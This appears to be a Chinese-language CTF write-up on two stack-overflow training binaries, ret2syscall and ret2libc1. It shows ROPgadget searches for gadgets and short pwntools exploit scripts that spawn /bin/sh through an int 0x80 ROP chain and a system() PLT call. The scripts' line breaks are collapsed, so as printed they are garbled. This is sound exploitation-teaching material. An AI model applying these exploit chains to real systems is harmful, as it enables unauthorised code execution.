gcc -m32 -no-pie -fno-stack-protector --static -o ret2syscall ret2syscall.c

这题自己编译需要静态连接以提供ROP链，但自己编译的可能ROP链不够，建议还是网上下。
https://github.com/10-0-0-55/slides/blob/bee7ac1e36aa4b68ec23e51f86e31bfdfa6e819a/pwn/rop/examples/ret2syscall/ret2syscall

正如同这题的提示一样，我们没有后门函数，也没有-z execstack以执行shellcode。但是这题刻意给了个shell全局变量为/bin/sh，这正是ROP链的常见提示。
在ROP链中，我们的目的是利用汇编执行execve("/bin/sh",NULL,NULL)
要做到这一点，就必须利用程序已经存在的地址中的汇编代码，要求pop eax/ebx/ecx/edx;ret这种形式的汇编代码，这样我们就能给寄存器附上想要的值。
执行execve("/bin/sh",NULL,NULL)的栈帧如下 (高低逆向)

可以理解为执行了这么个方法

init 0x80(eax = 0xb, ebx = /bin/sh_addr, ecx = 0x0, edx = 0x0 )
其中int 0x80和/bin/sh题目给定，所以题目的关键就是自己寻找pop+ret的ROP链，有点类似找反序列化链。
先找出int 0x80和/bin/sh的地址，也可以在ida中找。
ROPgadget --binary ./ret2syscall --only "int"
ROPgadget --binary ./ret2syscall --string "/bin/sh"

0x080be408和0x08049421

再找pop+ret，优先找eax和ebx的， ecx和edx不是必要赋值的，有时候运气好，这俩会默认为0

ROPgadget --binary ./ret2syscall --only "pop|ret" | grep"eax"

eax为0x080bb196

ROPgadget --binary ./ret2syscall --only "pop|ret" | grep"ebx"

ebx就有很多可以选择的了，其中标准答案是0x0806eb90，因为它可以同时控制ecx和edx。

写脚本试试，找偏移量的过程略过了，其实根据ret2shellcode的char buf[100]偏移量为112，可以猜测这题也一样。


#!/usr/bin/envpythonfrompwn import *
sh =process("./ret2syscall")
pop_eax_ret= 0x080bb196pop_edx_ecx_ebx_ret= 0x0806eb90sh_addr= 0x080be408int_80_addr= 0x08049421
payload="A"*112+p32(pop_eax_ret)+p32(0xb)+p32(pop_edx_ecx_ebx_ret)+p32(0x0)+p32(0x0)+p32(sh_addr)+p32(int_80_addr)print(payload)
sh.sendline(payload)sh.interactive()


我们也可以试一试其他地址

0x080481c9: pop ebx ; ret

0x0806eb69: pop ebx ; pop edx ; ret

0x0806eb91: pop ecx ; pop ebx ; ret

最终发现0x0806eb91可以，其他两个不行，这证明此时edx为空，ecx是有值的。

https://github.com/ctf-wiki/ctf-challenges/blob/e3096c90f0e240e19f905ac5670b0984fb1ff29e/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1
还是不要自己编译。这题和ret2syscall很像，但由于是动态连接库，所以pop+ret链极少，也没有int 0x80。

但有个看起来像是后门函数的secure()，但仔细看C代码，secretcode是一个随机值，要求input==secretcode，等于要我们去猜随机值。而且最后执行的是system("shell!?")这种无意义的命令。

所以这个后门函数无法直接利用，但由于这个后门函数调用了system()函数，即使它无法利用，也会在plt表中注册system()的地址。这个地址用gdb的plt命令可以找到。

gdb ret2libc1

plt

当然，在ida中也能看到

顺便把/bin/sh的地址也在ida中找出来

0x8048460和0x8048720

但执行system还需要一个返回地址，也就是ebp的高位是返回地址。以执行system("/bin/sh");exit(0)为例

但这里exit()不是必要的，因为执行了system("/bin/sh")就够了，后面跳转到哪个地址已经不重要了，所以只需要在system地址和/bin/sh地址之间随便填充4个字节即可。

#!/usr/bin/envpythonfrompwn import * sh =process("./ret2libc1")system_addr= 0x8048460sh_addr= 0x8048720 payload= "A"*112+p32(system_addr)+"B"*4+p32(sh_addr)sh.sendline(payload)sh.interactive()
